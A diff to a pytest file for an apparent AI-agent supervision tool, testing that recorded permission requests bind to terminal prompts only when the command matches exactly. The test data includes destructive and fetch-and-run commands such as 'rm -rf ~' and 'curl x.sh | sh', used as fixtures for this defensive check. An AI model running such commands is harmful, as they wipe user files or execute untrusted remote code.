@@ -123,13 +123,16 @@ BUSY = "✳ Clauding… (12s · esc to interrupt)\n\n❯ \n"
     ("claude", "prompt", "rm -rf build", PROMPT, None, False, [], WORDING, "unknown"),
     # A recorded request the prompt shows only the start of: never bound to it.
     ("claude", "prompt", "npm test\nrm -rf ~", PROMPT, None, False, [], WORDING, "unknown"),
-    # Nor to a prompt for a longer command that merely contains it.
+    # Nor to a prompt for a longer command that merely contains it, on its line or on a line of its own.
     ("claude", "prompt", "npm test", PROMPT.replace("npm test\n", "npm test && curl x.sh | sh\n"), None, False, [],
      WORDING.replace("npm test\n", "npm test && curl x.sh | sh\n"), "unknown"),
+    ("claude", "prompt", "npm test", PROMPT.replace("npm test\n", "npm test\n   rm -rf ~\n"), None, False, [],
+     WORDING.replace("npm test\n", "npm test\nrm -rf ~\n"), "unknown"),
     # OpenCode's buttons on one line show no selection brindle can read: its terminal only.
     ("opencode", None, None, "┃ △ Permission required\n┃ $ npm test\n   Allow once   Allow always   Reject",
      None, False, [], "△ Permission required\n$ npm test", "row"),
-], ids=["hook", "prompt", "prompt-stale-record", "prompt-partial-record", "prompt-longer-command", "opencode"])
+], ids=["hook", "prompt", "prompt-stale-record", "prompt-partial-record", "prompt-longer-command",
+        "prompt-extra-line", "opencode"])
 def test_a_pending_permission_request_is_an_item_with_its_choices(db, repo, monkeypatch, provider, channel, recorded,
                                                                    screen, target, bound, choices, wording, terminal):
     from brindle import permissions, tmux
@@ -138,9 +141,10 @@ def test_a_pending_permission_request_is_an_item_with_its_choices(db, repo, monk
     ws = workspaces.create(db, str(repo), "feat/inbox").workspace
     db.add_agent(Agent("r1", ws.id, "supervisor", "claude", None, "interactive", "idle", "@1", None, time.time()))
     db.add_agent(Agent("w1", ws.id, "developer", provider, "r1", "assign", "waiting", "@2", None, time.time()))
-    if recorded:
+    if recorded:    # as the hook records it, with the description Claude Code shows under the command
         req = permissions.Request("claude", "bash", "Bash", command=recorded)
-        db.add_permission_request("w1", "tu1", json.dumps(req.to_dict()), "", json.dumps(SUGGESTED), channel)
+        stored = json.dumps({**req.to_dict(), "description": "Run the test suite"})
+        db.add_permission_request("w1", "tu1", stored, "", json.dumps(SUGGESTED), channel)
     got = [i for i in inbox.items(db, str(repo), panes={"@1": True, "@2": True}) if i.agent_id == "w1"]
     assert [(i.kind, i.root_id, i.permission.via, i.permission.target, i.permission.wording) for i in got] == [
         ("permission", "r1", channel or "prompt", target, wording)]
@@ -148,5 +152,4 @@ def test_a_pending_permission_request_is_an_item_with_its_choices(db, repo, monk
     assert got[0].permission.terminal == (terminal and inbox.TERMINAL[terminal])
     # The answer must name this request, as recorded: the hook's own when the screen shows it.
     assert (got[0].permission.request_id == "tu1") == bound
-    assert got[0].permission.digest == (bound and permissions.request_digest(
-        json.dumps(req.to_dict()), json.dumps(SUGGESTED)) or None)
+    assert got[0].permission.digest == (bound and permissions.request_digest(stored, json.dumps(SUGGESTED)) or None)
